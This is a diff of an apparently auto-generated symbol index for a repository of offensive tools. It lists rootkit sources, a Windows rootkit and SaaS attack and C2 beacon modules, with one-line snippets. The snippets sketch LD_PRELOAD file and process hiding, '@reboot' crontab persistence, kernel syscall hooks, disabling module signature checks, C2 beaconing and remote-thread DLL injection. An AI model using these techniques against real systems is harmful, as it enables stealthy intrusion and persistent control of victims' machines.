-| `setenv` | function | `modules/rootkit/mr.c:578` | `setenv("LD_PRELOAD", DESIRED_LD_PRELOAD, 1);` |
-| `setsid` | function | `modules/rootkit/mr.c:565` | `setsid();` |
-| `signal` | function | `modules/rootkit/mr.c:655` | `signal(SIGTERM, signal_handler);` |
-| `signal_handler` | function | `modules/rootkit/mr.c:608` | `void signal_handler(int signum)` |
-| `sleep` | function | `modules/rootkit/mr.c:527` | `sleep(1);` |
-| `snprintf` | function | `modules/rootkit/mr.c:159` | `snprintf(command, sizeof(command), "@reboot %s\n", path);` |
-| `srand` | function | `modules/rootkit/mr.c:169` | `srand(time(NULL));` |
-| `system` | function | `modules/rootkit/mr.c:163` | `system(command);` |
-| `time` | function | `modules/rootkit/mr.c:491` | `time(&current_time);` |
-| `unload_rootkit` | function | `modules/rootkit/mr.c:313` | `void unload_rootkit()` |
-| `unsetenv` | function | `modules/rootkit/mr.c:455` | `unsetenv("LD_PRELOAD");` |
-| `waitpid` | function | `modules/rootkit/mr.c:113` | `waitpid(pid, NULL, 0);` |
-| `write_file` | function | `modules/rootkit/mr.c:144` | `void write_file(const char *path, const char *content, mode_t mode)` |
-| `xdg` | function | `modules/rootkit/mr.c:177` | `void xdg(const char *path, int admin)` |
+| `signal_handler` | function | `modules/rootkit/mr.c:609` | `void signal_handler(int signum)` |
+| `unload_rootkit` | function | `modules/rootkit/mr.c:314` | `void unload_rootkit()` |
+| `write_file` | function | `modules/rootkit/mr.c:145` | `void write_file(const char *path, const char *content, mode_t mode)` |
+| `xdg` | function | `modules/rootkit/mr.c:178` | `void xdg(const char *path, int admin)` |
 | `FILE_HIDE_PATH` | macro | `modules/rootkit/mrhyde.c:50` | `#define FILE_HIDE_PATH` |
-| `HIDDEN_DIR` | macro | `modules/rootkit/mrhyde.c:32` | `#define HIDDEN_DIR` |
+| `HIDDEN_DIR` | macro | `modules/rootkit/mrhyde.c:33` | `#define HIDDEN_DIR` |
 | `HIDDEN_FILE` | macro | `modules/rootkit/mrhyde.c:34` | `#define HIDDEN_FILE` |
 | `HIDDEN_FILE1` | macro | `modules/rootkit/mrhyde.c:35` | `#define HIDDEN_FILE1` |
 | `HIDDEN_FILE2` | macro | `modules/rootkit/mrhyde.c:36` | `#define HIDDEN_FILE2` |
@@ -7242,51 +7130,33 @@ str_cut(char str[], int slice_from, int slice_to)` |
 | `HIDDEN_FILE7` | macro | `modules/rootkit/mrhyde.c:41` | `#define HIDDEN_FILE7` |
 | `HIDDEN_FILE8` | macro | `modules/rootkit/mrhyde.c:42` | `#define HIDDEN_FILE8` |
 | `HIDDEN_FILE9` | macro | `modules/rootkit/mrhyde.c:43` | `#define HIDDEN_FILE9` |
-| `HIDE_DIR` | macro | `modules/rootkit/mrhyde.c:45` | `#define HIDE_DIR` |
+| `HIDE_DIR` | macro | `modules/rootkit/mrhyde.c:46` | `#define HIDE_DIR` |
 | `HIDE_USER` | macro | `modules/rootkit/mrhyde.c:47` | `#define HIDE_USER` |
 | `MAX_HIDE_PIDS` | macro | `modules/rootkit/mrhyde.c:48` | `#define MAX_HIDE_PIDS` |
 | `PATHMRHYDE` | macro | `modules/rootkit/mrhyde.c:44` | `#define PATHMRHYDE` |
 | `PID_FILE_PATH` | macro | `modules/rootkit/mrhyde.c:49` | `#define PID_FILE_PATH` |
-| `closedir` | function | `modules/rootkit/mrhyde.c:698` | `closedir(proc);` |
-| `fclose` | function | `modules/rootkit/mrhyde.c:89` | `fclose(file);` |
 | `fopen` | function | `modules/rootkit/mrhyde.c:283` | `FILE *fopen(const char *pathname, const char *mode)` |
-| `fprintf` | function | `modules/rootkit/mrhyde.c:226` | `fprintf(stderr, "Error in dlsym: %s\n", dlerror());` |
 | `fstat` | function | `modules/rootkit/mrhyde.c:503` | `int fstat(int fd, struct stat *statbuf)` |
-| `get_username_from_pid` | function | `modules/rootkit/mrhyde.c:177` | `char* get_username_from_pid(pid_t pid)` |
+| `get_username_from_pid` | function | `modules/rootkit/mrhyde.c:178` | `char* get_username_from_pid(pid_t pid)` |
 | `getdents` | function | `modules/rootkit/mrhyde.c:557` | `int getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)` |
 | `getdents64` | function | `modules/rootkit/mrhyde.c:618` | `int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)` |
-| `int` | function | `modules/rootkit/mrhyde.c:54` | `typedef int (*orig_unlink_f_type)(const char *pathname);` |
-| `kill` | function | `modules/rootkit/mrhyde.c:124` | `int kill(pid_t pid, int sig)` |
+| `kill` | function | `modules/rootkit/mrhyde.c:125` | `int kill(pid_t pid, int sig)` |
 | `linux_dirent64` | struct | `modules/rootkit/mrhyde.c:548` | `` |
-| `load_hidden_files` | function | `modules/rootkit/mrhyde.c:92` | `void load_hidden_files()` |
-| `load_hidden_pids` | function | `modules/rootkit/mrhyde.c:72` | `void load_hidden_pids()` |
+| `load_hidden_files` | function | `modules/rootkit/mrhyde.c:93` | `void load_hidden_files()` |
+| `load_hidden_pids` | function | `modules/rootkit/mrhyde.c:73` | `void load_hidden_pids()` |
 | `lstat` | function | `modules/rootkit/mrhyde.c:459` | `int lstat(const char *pathname, struct stat *statbuf)` |
-| `main` | function | `modules/rootkit/mrhyde.c:677` | `int main()` |
-| `memmove` | function | `modules/rootkit/mrhyde.c:606` | `memmove(dirp + offset, dirp + offset + dir->d_reclen, nread - (offset + dir->d_reclen));` |
+| `main` | function | `modules/rootkit/mrhyde.c:678` | `int main()` |
 | `my_open` | function | `modules/rootkit/mrhyde.c:327` | `int my_open(const char *pathname, int flags, mode_t mode)` |
 | `my_openat` | function | `modules/rootkit/mrhyde.c:371` | `int my_openat(int dirfd, const char *pathname, int flags, mode_t mode)` |
-| `orig_fopen` | function | `modules/rootkit/mrhyde.c:322` | `return orig_fopen(pathname, mode);` |
-| `orig_fstat` | function | `modules/rootkit/mrhyde.c:544` | `return orig_fstat(fd, statbuf);` |
-| `orig_kill` | function | `modules/rootkit/mrhyde.c:141` | `return orig_kill(pid, sig);` |
-| `orig_lstat` | function | `modules/rootkit/mrhyde.c:498` | `return orig_lstat(pathname, statbuf);` |
-| `orig_open` | function | `modules/rootkit/mrhyde.c:366` | `return orig_open(pathname, flags, mode);` |
-| `orig_openat` | function | `modules/rootkit/mrhyde.c:410` | `return orig_openat(dirfd, pathname, flags, mode);` |
-| `orig_remove` | function | `modules/rootkit/mrhyde.c:153` | `return orig_remove(pathname);` |
-| `orig_stat` | function | `modules/rootkit/mrhyde.c:454` | `return orig_stat(pathname, statbuf);` |
-| `orig_unlink` | function | `modules/rootkit/mrhyde.c:121` | `return orig_unlink(pathname);` |
-| `orig_unlinkat` | function | `modules/rootkit/mrhyde.c:175` | `return orig_unlinkat(dirfd, pathname, flags);` |
 | `original_dirent` | type_alias | `modules/rootkit/mrhyde.c:51` | `typedef struct dirent original_dirent;` |
-| `perror` | function | `modules/rootkit/mrhyde.c:76` | `perror("Error opening PID file");` |
-| `printf` | function | `modules/rootkit/mrhyde.c:693` | `printf("PID: %ld, Username: %s\n", pid, username);` |
-| `readdir` | function | `modules/rootkit/mrhyde.c:221` | `struct dirent* readdir(DIR* dirp)` |
-| `remove` | function | `modules/rootkit/mrhyde.c:144` | `int remove(const char *pathname)` |
-| `should_hide_file` | function | `modules/rootkit/mrhyde.c:211` | `int should_hide_file(const char* filename)` |
-| `should_hide_pid` | function | `modules/rootkit/mrhyde.c:196` | `int should_hide_pid(const char* pid)` |
-| `snprintf` | function | `modules/rootkit/mrhyde.c:183` | `snprintf(path, sizeof(path), "/proc/%d", pid);` |
+| `readdir` | function | `modules/rootkit/mrhyde.c:222` | `struct dirent* readdir(DIR* dirp)` |
+| `remove` | function | `modules/rootkit/mrhyde.c:145` | `int remove(const char *pathname)` |
+| `should_hide_file` | function | `modules/rootkit/mrhyde.c:212` | `int should_hide_file(const char* filename)` |
+| `should_hide_pid` | function | `modules/rootkit/mrhyde.c:197` | `int should_hide_pid(const char* pid)` |
 | `stat` | function | `modules/rootkit/mrhyde.c:415` | `int stat(const char *pathname, struct stat *statbuf)` |
-| `unlink` | function | `modules/rootkit/mrhyde.c:112` | `int unlink(const char *pathname)` |
-| `unlinkat` | function | `modules/rootkit/mrhyde.c:156` | `int unlinkat(int dirfd, const char *pathname, int flags)` |
-| `HIDDEN_DIR` | macro | `modules/rootkit/mrhyde2.c:30` | `#define HIDDEN_DIR` |
+| `unlink` | function | `modules/rootkit/mrhyde.c:113` | `int unlink(const char *pathname)` |
+| `unlinkat` | function | `modules/rootkit/mrhyde.c:157` | `int unlinkat(int dirfd, const char *pathname, int flags)` |
+| `HIDDEN_DIR` | macro | `modules/rootkit/mrhyde2.c:31` | `#define HIDDEN_DIR` |
 | `HIDDEN_FILE` | macro | `modules/rootkit/mrhyde2.c:32` | `#define HIDDEN_FILE` |
 | `HIDDEN_FILE1` | macro | `modules/rootkit/mrhyde2.c:33` | `#define HIDDEN_FILE1` |
 | `HIDDEN_FILE2` | macro | `modules/rootkit/mrhyde2.c:34` | `#define HIDDEN_FILE2` |
@@ -7297,48 +7167,30 @@ str_cut(char str[], int slice_from, int slice_to)` |
 | `HIDDEN_FILE7` | macro | `modules/rootkit/mrhyde2.c:39` | `#define HIDDEN_FILE7` |
 | `HIDDEN_FILE8` | macro | `modules/rootkit/mrhyde2.c:40` | `#define HIDDEN_FILE8` |
 | `HIDDEN_FILE9` | macro | `modules/rootkit/mrhyde2.c:41` | `#define HIDDEN_FILE9` |
-| `HIDE_DIR` | macro | `modules/rootkit/mrhyde2.c:43` | `#define HIDE_DIR` |
+| `HIDE_DIR` | macro | `modules/rootkit/mrhyde2.c:44` | `#define HIDE_DIR` |
 | `HIDE_USER` | macro | `modules/rootkit/mrhyde2.c:45` | `#define HIDE_USER` |
 | `MAX_HIDE_PIDS` | macro | `modules/rootkit/mrhyde2.c:46` | `#define MAX_HIDE_PIDS` |
 | `PATHMRHYDE` | macro | `modules/rootkit/mrhyde2.c:42` | `#define PATHMRHYDE` |
 | `PID_FILE_PATH` | macro | `modules/rootkit/mrhyde2.c:47` | `#define PID_FILE_PATH` |
-| `closedir` | function | `modules/rootkit/mrhyde2.c:603` | `closedir(proc);` |
-| `fclose` | function | `modules/rootkit/mrhyde2.c:79` | `fclose(file);` |
 | `fopen` | function | `modules/rootkit/mrhyde2.c:238` | `FILE *fopen(const char *pathname, const char *mode)` |
-| `fprintf` | function | `modules/rootkit/mrhyde2.c:186` | `fprintf(stderr, "Error in dlsym: %s\n", dlerror());` |
 | `fstat` | function | `modules/rootkit/mrhyde2.c:423` | `int fstat(int fd, struct stat *statbuf)` |
-| `get_username_from_pid` | function | `modules/rootkit/mrhyde2.c:147` | `char* get_username_from_pid(pid_t pid)` |
+| `get_username_from_pid` | function | `modules/rootkit/mrhyde2.c:148` | `char* get_username_from_pid(pid_t pid)` |
 | `getdents` | function | `modules/rootkit/mrhyde2.c:470` | `int getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)` |
 | `getdents64` | function | `modules/rootkit/mrhyde2.c:527` | `int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)` |
-| `int` | function | `modules/rootkit/mrhyde2.c:51` | `typedef int (*orig_unlink_f_type)(const char *pathname);` |
-| `kill` | function | `modules/rootkit/mrhyde2.c:94` | `int kill(pid_t pid, int sig)` |
+| `kill` | function | `modules/rootkit/mrhyde2.c:95` | `int kill(pid_t pid, int sig)` |
 | `linux_dirent64` | struct | `modules/rootkit/mrhyde2.c:461` | `` |
-| `load_hidden_pids` | function | `modules/rootkit/mrhyde2.c:62` | `void load_hidden_pids()` |
+| `load_hidden_pids` | function | `modules/rootkit/mrhyde2.c:63` | `void load_hidden_pids()` |
 | `lstat` | function | `modules/rootkit/mrhyde2.c:386` | `int lstat(const char *pathname, struct stat *statbuf)` |
-| `main` | function | `modules/rootkit/mrhyde2.c:582` | `int main()` |
-| `memmove` | function | `modules/rootkit/mrhyde2.c:515` | `memmove(dirp + offset, dirp + offset + dir->d_reclen, nread - (offset + dir->d_reclen));` |
+| `main` | function | `modules/rootkit/mrhyde2.c:583` | `int main()` |
 | `my_open` | function | `modules/rootkit/mrhyde2.c:275` | `int my_open(const char *pathname, int flags, mode_t mode)` |
 | `my_openat` | function | `modules/rootkit/mrhyde2.c:312` | `int my_openat(int dirfd, const char *pathname, int flags, mode_t mode)` |
-| `orig_fopen` | function | `modules/rootkit/mrhyde2.c:270` | `return orig_fopen(pathname, mode);` |
-| `orig_fstat` | function | `modules/rootkit/mrhyde2.c:457` | `return orig_fstat(fd, statbuf);` |
-| `orig_kill` | function | `modules/rootkit/mrhyde2.c:111` | `return orig_kill(pid, sig);` |
-| `orig_lstat` | function | `modules/rootkit/mrhyde2.c:418` | `return orig_lstat(pathname, statbuf);` |
-| `orig_open` | function | `modules/rootkit/mrhyde2.c:307` | `return orig_open(pathname, flags, mode);` |
-| `orig_openat` | function | `modules/rootkit/mrhyde2.c:344` | `return orig_openat(dirfd, pathname, flags, mode);` |
-| `orig_remove` | function | `modules/rootkit/mrhyde2.c:123` | `return orig_remove(pathname);` |
-| `orig_stat` | function | `modules/rootkit/mrhyde2.c:381` | `return orig_stat(pathname, statbuf);` |
-| `orig_unlink` | function | `modules/rootkit/mrhyde2.c:91` | `return orig_unlink(pathname);` |
-| `orig_unlinkat` | function | `modules/rootkit/mrhyde2.c:145` | `return orig_unlinkat(dirfd, pathname, flags);` |
 | `original_dirent` | type_alias | `modules/rootkit/mrhyde2.c:48` | `typedef struct dirent original_dirent;` |
-| `perror` | function | `modules/rootkit/mrhyde2.c:66` | `perror("Error opening PID file");` |
-| `printf` | function | `modules/rootkit/mrhyde2.c:598` | `printf("PID: %ld, Username: %s\n", pid, username);` |
-| `readdir` | function | `modules/rootkit/mrhyde2.c:181` | `struct dirent* readdir(DIR* dirp)` |
-| `remove` | function | `modules/rootkit/mrhyde2.c:114` | `int remove(const char *pathname)` |
-| `should_hide_pid` | function | `modules/rootkit/mrhyde2.c:166` | `int should_hide_pid(const char* pid)` |
-| `snprintf` | function | `modules/rootkit/mrhyde2.c:153` | `snprintf(path, sizeof(path), "/proc/%d", pid);` |
+| `readdir` | function | `modules/rootkit/mrhyde2.c:182` | `struct dirent* readdir(DIR* dirp)` |
+| `remove` | function | `modules/rootkit/mrhyde2.c:115` | `int remove(const char *pathname)` |
+| `should_hide_pid` | function | `modules/rootkit/mrhyde2.c:167` | `int should_hide_pid(const char* pid)` |
 | `stat` | function | `modules/rootkit/mrhyde2.c:349` | `int stat(const char *pathname, struct stat *statbuf)` |
-| `unlink` | function | `modules/rootkit/mrhyde2.c:82` | `int unlink(const char *pathname)` |
-| `unlinkat` | function | `modules/rootkit/mrhyde2.c:126` | `int unlinkat(int dirfd, const char *pathname, int flags)` |
+| `unlink` | function | `modules/rootkit/mrhyde2.c:83` | `int unlink(const char *pathname)` |
+| `unlinkat` | function | `modules/rootkit/mrhyde2.c:127` | `int unlinkat(int dirfd, const char *pathname, int flags)` |
 | `C2_PORT` | macro | `modules/rootkit/mrhyde3.c:53` | `#define C2_PORT` |
 | `C2_SERVER_IP` | macro | `modules/rootkit/mrhyde3.c:52` | `#define C2_SERVER_IP` |
 | `CQE_TIMEOUT_MS` | macro | `modules/rootkit/mrhyde3.c:54` | `#define CQE_TIMEOUT_MS` |
@@ -7361,97 +7213,56 @@ str_cut(char str[], int slice_from, int slice_to)` |
 | `MAX_HIDE_PIDS` | macro | `modules/rootkit/mrhyde3.c:47` | `#define MAX_HIDE_PIDS` |
 | `PATHMRHYDE` | macro | `modules/rootkit/mrhyde3.c:44` | `#define PATHMRHYDE` |
 | `PID_FILE_PATH` | macro | `modules/rootkit/mrhyde3.c:48` | `#define PID_FILE_PATH` |
-| `_GNU_SOURCE` | macro | `modules/rootkit/mrhyde3.c:6` | `#define _GNU_SOURCE` |
+| `_GNU_SOURCE` | macro | `modules/rootkit/mrhyde3.c:7` | `#define _GNU_SOURCE` |
 | `__io_uring_enter` | function | `modules/rootkit/mrhyde3.c:76` | `static inline int __io_uring_enter(int fd, unsigned int to_submit, unsigned int min_complete,
    ...` |
 | `__io_uring_register` | function | `modules/rootkit/mrhyde3.c:80` | `static inline int __io_uring_register(int fd, unsigned int opcode, const void *arg, unsigned int ...` |
 | `__io_uring_setup` | function | `modules/rootkit/mrhyde3.c:73` | `static inline int __io_uring_setup(unsigned int entries, struct io_uring_params *p)` |
-| `close` | function | `modules/rootkit/mrhyde3.c:246` | `close(fd);` |
-| `fclose` | function | `modules/rootkit/mrhyde3.c:263` | `fclose(f);` |
 | `fopen` | function | `modules/rootkit/mrhyde3.c:407` | `FILE *fopen(const char *pathname, const char *mode)` |
-| `free` | function | `modules/rootkit/mrhyde3.c:191` | `free(iov.iov_base);` |
-| `fseek` | function | `modules/rootkit/mrhyde3.c:256` | `fseek(f, 0, SEEK_END);` |
 | `fstat` | function | `modules/rootkit/mrhyde3.c:535` | `int fstat(int fd, struct stat *statbuf)` |
 | `get_username_from_pid` | function | `modules/rootkit/mrhyde3.c:297` | `char* get_username_from_pid(pid_t pid)` |
 | `getdents` | function | `modules/rootkit/mrhyde3.c:569` | `int getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)` |
-| `getdents64` | function | `modules/rootkit/mrhyde3.c:604` | `ssize_t getdents64(int fd, void *dirp, size_t count)` |
-| `inet_pton` | function | `modules/rootkit/mrhyde3.c:657` | `inet_pton(AF_INET, C2_SERVER_IP, &server_addr.sin_addr);` |
+| `getdents64` | function | `modules/rootkit/mrhyde3.c:605` | `ssize_t getdents64(int fd, void *dirp, size_t count)` |
 | `init_root_ring` | function | `modules/rootkit/mrhyde3.c:176` | `static int init_root_ring(void)` |
-| `int` | function | `modules/rootkit/mrhyde3.c:314` | `typedef int (*orig_unlink_f_type)(const char *pathname);` |
 | `io_uring` | struct | `modules/rootkit/mrhyde3.c:65` | `` |
 | `io_uring_cq` | struct | `modules/rootkit/mrhyde3.c:61` | `` |
 | `io_uring_sq` | struct | `modules/rootkit/mrhyde3.c:57` | `` |
 | `kill` | function | `modules/rootkit/mrhyde3.c:373` | `int kill(pid_t pid, int sig)` |
 | `linux_dirent64` | struct | `modules/rootkit/mrhyde3.c:560` | `` |
-| `load_hidden_files` | function | `modules/rootkit/mrhyde3.c:281` | `void load_hidden_files(void)` |
+| `load_hidden_files` | function | `modules/rootkit/mrhyde3.c:282` | `void load_hidden_files(void)` |
 | `load_hidden_pids` | function | `modules/rootkit/mrhyde3.c:268` | `void load_hidden_pids(void)` |
 | `lstat` | function | `modules/rootkit/mrhyde3.c:511` | `int lstat(const char *pathname, struct stat *statbuf)` |
-| `memcpy` | function | `modules/rootkit/mrhyde3.c:242` | `memcpy(buf + total_read, block, bytes_read);` |
-| `memmove` | function | `modules/rootkit/mrhyde3.c:596` | `memmove(dirp + offset, dirp + offset + dir->d_reclen, nread - (offset + dir->d_reclen));` |
-| `memset` | function | `modules/rootkit/mrhyde3.c:87` | `memset(&params, 0, sizeof(params));` |
-| `open` | function | `modules/rootkit/mrhyde3.c:429` | `int open(const char *pathname, int flags, ...)` |
-| `openat` | function | `modules/rootkit/mrhyde3.c:457` | `int openat(int dirfd, const char *pathname, int flags, ...)` |
-| `orig_fopen` | function | `modules/rootkit/mrhyde3.c:427` | `return orig_fopen(pathname, mode);` |
-| `orig_fstat` | function | `modules/rootkit/mrhyde3.c:557` | `return orig_fstat(fd, statbuf);` |
-| `orig_kill` | function | `modules/rootkit/mrhyde3.c:381` | `return orig_kill(pid, sig);` |
-| `orig_lstat` | function | `modules/rootkit/mrhyde3.c:531` | `return orig_lstat(pathname, statbuf);` |
-| `orig_open` | function | `modules/rootkit/mrhyde3.c:455` | `return orig_open(pathname, flags, mode);` |
-| `orig_openat` | function | `modules/rootkit/mrhyde3.c:483` | `return orig_openat(dirfd, pathname, flags, mode);` |
-| `orig_remove` | function | `modules/rootkit/mrhyde3.c:387` | `return orig_remove(pathname);` |
-| `orig_stat` | function | `modules/rootkit/mrhyde3.c:507` | `return orig_stat(pathname, statbuf);` |
-| `orig_unlink` | function | `modules/rootkit/mrhyde3.c:371` | `return orig_unlink(pathname);` |
-| `orig_unlinkat` | function | `modules/rootkit/mrhyde3.c:403` | `return orig_unlinkat(dirfd, pathname, flags);` |
+| `open` | function | `modules/rootkit/mrhyde3.c:430` | `int open(const char *pathname, int flags, ...)` |
+| `openat` | function | `modules/rootkit/mrhyde3.c:458` | `int openat(int dirfd, const char *pathname, int flags, ...)` |
 | `original_dirent` | type_alias | `modules/rootkit/mrhyde3.c:312` | `typedef struct dirent original_dirent;` |
-| `pthread_create` | function | `modules/rootkit/mrhyde3.c:714` | `pthread_create(&c2_thread, NULL, c2_beacon_thread, NULL);` |
-| `pthread_detach` | function | `modules/rootkit/mrhyde3.c:715` | `pthread_detach(c2_thread);` |
-| `pthread_mutex_lock` | function | `modules/rootkit/mrhyde3.c:199` | `pthread_mutex_lock(&ring_mutex);` |
-| `pthread_mutex_unlock` | function | `modules/rootkit/mrhyde3.c:248` | `pthread_mutex_unlock(&ring_mutex);` |
-| `readdir` | function | `modules/rootkit/mrhyde3.c:335` | `struct dirent* readdir(DIR* dirp)` |
+| `readdir` | function | `modules/rootkit/mrhyde3.c:336` | `struct dirent* readdir(DIR* dirp)` |
 | `remove` | function | `modules/rootkit/mrhyde3.c:383` | `int remove(const char *pathname)` |
 | `should_hide_file` | function | `modules/rootkit/mrhyde3.c:329` | `int should_hide_file(const char* filename)` |
-| `should_hide_pid` | function | `modules/rootkit/mrhyde3.c:319` | `int should_hide_pid(const char* pid)` |
-| `sleep` | function | `modules/rootkit/mrhyde3.c:697` | `sleep(60);` |
-| `snprintf` | function | `modules/rootkit/mrhyde3.c:302` | `snprintf(path, sizeof(path), "/proc/%d", pid);` |
+| `should_hide_pid` | function | `modules/rootkit/mrhyde3.c:320` | `int should_hide_pid(const char* pid)` |
 | `stat` | function | `modules/rootkit/mrhyde3.c:487` | `int stat(const char *pathname, struct stat *statbuf)` |
-| `syscall` | function | `modules/rootkit/mrhyde3.c:74` | `return syscall(__NR_io_uring_setup, entries, p);` |
 | `traditional_read_file` | function | `modules/rootkit/mrhyde3.c:253` | `static char *traditional_read_file(const char *path)` |
-| `unlink` | function | `modules/rootkit/mrhyde3.c:366` | `int unlink(const char *pathname)` |
+| `unlink` | function | `modules/rootkit/mrhyde3.c:367` | `int unlink(const char *pathname)` |
 | `unlinkat` | function | `modules/rootkit/mrhyde3.c:389` | `int unlinkat(int dirfd, const char *pathname, int flags)` |
-| `uring_cqe_seen` | function | `modules/rootkit/mrhyde3.c:162` | `static void uring_cqe_seen(struct io_uring *ring, struct io_uring_cqe *cqe)` |
+| `uring_cqe_seen` | function | `modules/rootkit/mrhyde3.c:163` | `static void uring_cqe_seen(struct io_uring *ring, struct io_uring_cqe *cqe)` |
 | `uring_get_sqe` | function | `modules/rootkit/mrhyde3.c:130` | `static struct io_uring_sqe *uring_get_sqe(struct io_uring *ring)` |
 | `uring_queue_init` | function | `modules/rootkit/mrhyde3.c:85` | `static int uring_queue_init(unsigned int entries, struct io_uring *ring)` |
 | `uring_read_whole_file` | function | `modules/rootkit/mrhyde3.c:197` | `static char *uring_read_whole_file(const char *path)` |
 | `uring_submit` | function | `modules/rootkit/mrhyde3.c:141` | `static int uring_submit(struct io_uring *ring)` |
 | `uring_wait_cqe_timeout` | function | `modules/rootkit/mrhyde3.c:149` | `static int uring_wait_cqe_timeout(struct io_uring *ring, struct io_uring_cqe **cqe_ptr, int timeo...` |
-| `va_end` | function | `modules/rootkit/mrhyde3.c:454` | `va_end(args);` |
-| `va_start` | function | `modules/rootkit/mrhyde3.c:452` | `va_start(args, flags);` |
 | `_start` | function | `modules/rootkit/rootkit.asm:4` | `` |
 | `HIDDEN_FILE_NAME` | macro | `modules/rootkit/rootkit.c:27` | `#define HIDDEN_FILE_NAME` |
 | `HIDDEN_PROCESS_NAME` | macro | `modules/rootkit/rootkit.c:26` | `#define HIDDEN_PROCESS_NAME` |
 | `LISTENER_IP` | macro | `modules/rootkit/rootkit.c:28` | `#define LISTENER_IP` |
 | `LISTENER_PORT` | macro | `modules/rootkit/rootkit.c:29` | `#define LISTENER_PORT` |
-| `MODULE_LICENSE` | function | `modules/rootkit/rootkit.c:217` | `MODULE_LICENSE("GPL");` |
 | `SPECIAL_STRING` | macro | `modules/rootkit/rootkit.c:31` | `#define SPECIAL_STRING` |
 | `SPECIAL_STRING_PORT` | macro | `modules/rootkit/rootkit.c:34` | `#define SPECIAL_STRING_PORT` |
-| `call_usermodehelper` | function | `modules/rootkit/rootkit.c:166` | `call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);` |
 | `disable_module_signature_verification` | function | `modules/rootkit/rootkit.c:181` | `static void disable_module_signature_verification(void)` |
 | `hook_syscalls` | function | `modules/rootkit/rootkit.c:195` | `static int __init hook_syscalls(void)` |
 | `hooked_getdents` | function | `modules/rootkit/rootkit.c:75` | `static int hooked_getdents(struct kretprobe_instance *ri, struct pt_regs *regs)` |
 | `hooked_getdents64` | function | `modules/rootkit/rootkit.c:101` | `static int hooked_getdents64(struct kretprobe_instance *ri, struct pt_regs *regs)` |
 | `hooked_read` | function | `modules/rootkit/rootkit.c:127` | `static int hooked_read(struct kretprobe_instance *ri, struct pt_regs *regs)` |
-| `long` | function | `modules/rootkit/rootkit.c:38` | `asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);` |
-| `memmove` | function | `modules/rootkit/rootkit.c:89` | `memmove(dirent + offset, dirent + offset + dir->d_reclen, ret - (offset + dir->d_reclen));` |
-| `module_init` | function | `modules/rootkit/rootkit.c:214` | `module_init(hook_syscalls);` |
-| `original_read` | function | `modules/rootkit/rootkit.c:176` | `return original_read(fd, buf, count);` |
-| `printk` | function | `modules/rootkit/rootkit.c:146` | `printk(KERN_INFO "Special string found: %s\n", buffer);` |
-| `register_kretprobe` | function | `modules/rootkit/rootkit.c:200` | `register_kretprobe(&kretprobe_getdents);` |
 | `regs_override_return` | function | `modules/rootkit/rootkit.c:43` | `static inline void regs_override_return(struct pt_regs *regs, long new_ret)` |
-| `sock_release` | function | `modules/rootkit/rootkit.c:161` | `sock_release(sock);` |
-| `ssize_t` | function | `modules/rootkit/rootkit.c:40` | `asmlinkage ssize_t (*original_read)(int fd, void __user *buf, size_t count);` |
-| `strlen` | function | `modules/rootkit/rootkit.c:174` | `return strlen(backdoor_message);` |
 | `unhook_syscalls` | function | `modules/rootkit/rootkit.c:208` | `static void __exit unhook_syscalls(void)` |
-| `unregister_kretprobe` | function | `modules/rootkit/rootkit.c:210` | `unregister_kretprobe(&kretprobe_getdents);` |
-| `volatile` | function | `modules/rootkit/rootkit.c:185` | `asm volatile("mov %%cr4, %0" : "=r" (cr4));` |
 | `SaaSAttackEngine` | class | `modules/saas_attacks.py:151` | `class SaaSAttackEngine` |
 | `SaaSConfig` | class | `modules/saas_attacks.py:48` | `class SaaSConfig` |
 | `SaaSEnumerationTools` | class | `modules/saas_attacks.py:70` | `class SaaSEnumerationTools` |
@@ -7914,74 +7725,40 @@ str_cut(char str[], int slice_from, int slice_to)` |
 | `start_in_thread` | method | `modules/websocket_beacon.py:399` | `def start_in_thread(self)` |
 | `stop` | method | `modules/websocket_beacon.py:392` | `def stop(self)` |
 | `BUFFER_SIZE` | macro | `modules/win_rootkit/backup.c:18` | `#define BUFFER_SIZE` |
-| `CloseHandle` | function | `modules/win_rootkit/backup.c:81` | `CloseHandle(pi.hProcess);` |
 | `Command` | struct | `modules/win_rootkit/backup.c:27` | `` |
-| `CreateRemoteThread` | function | `modules/win_rootkit/backup.c:200` | `CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibrary, remoteMemory, 0, NULL);` |
 | `HIDE_FILE` | macro | `modules/win_rootkit/backup.c:21` | `#define HIDE_FILE` |
 | `KEY_FILE` | macro | `modules/win_rootkit/backup.c:22` | `#define KEY_FILE` |
 | `MAX_COMMANDS` | macro | `modules/win_rootkit/backup.c:19` | `#define MAX_COMMANDS` |
 | `PASSWORD` | macro | `modules/win_rootkit/backup.c:24` | `#define PASSWORD` |
 | `PID_FILE` | macro | `modules/win_rootkit/backup.c:20` | `#define PID_FILE` |
-| `PORT` | macro | `modules/win_rootkit/backup.c:16` | `#define PORT` |
-| `Sleep` | function | `modules/win_rootkit/backup.c:114` | `Sleep(1000 * (current_attempt + 1));` |
+| `PORT` | macro | `modules/win_rootkit/backup.c:17` | `#define PORT` |
 | `VirtualFile` | struct | `modules/win_rootkit/backup.c:33` | `` |
-| `WSACleanup` | function | `modules/win_rootkit/backup.c:630` | `WSACleanup();` |
-| `WaitForSingleObject` | function | `modules/win_rootkit/backup.c:80` | `WaitForSingleObject(pi.hProcess, INFINITE);` |
-| `WriteProcessMemory` | function | `modules/win_rootkit/backup.c:199` | `WriteProcessMemory(hProcess, remoteMemory, &hModule, sizeof(hModule), NULL);` |
-| `ZeroMemory` | function | `modules/win_rootkit/backup.c:73` | `ZeroMemory(&si, sizeof(si));` |
-| `_pclose` | function | `modules/win_rootkit/backup.c:107` | `_pclose(cmd);` |
-| `_putenv_s` | function | `modules/win_rootkit/backup.c:390` | `_putenv_s("LD_PRELOAD", "");` |
-| `closesocket` | function | `modules/win_rootkit/backup.c:218` | `closesocket(sock);` |
-| `elp` | function | `modules/win_rootkit/backup.c:63` | `void elp()` |
-| `ensure_hide_file_exists` | function | `modules/win_rootkit/backup.c:149` | `void ensure_hide_file_exists()` |
-| `ensure_key_file_exists` | function | `modules/win_rootkit/backup.c:122` | `void ensure_key_file_exists()` |
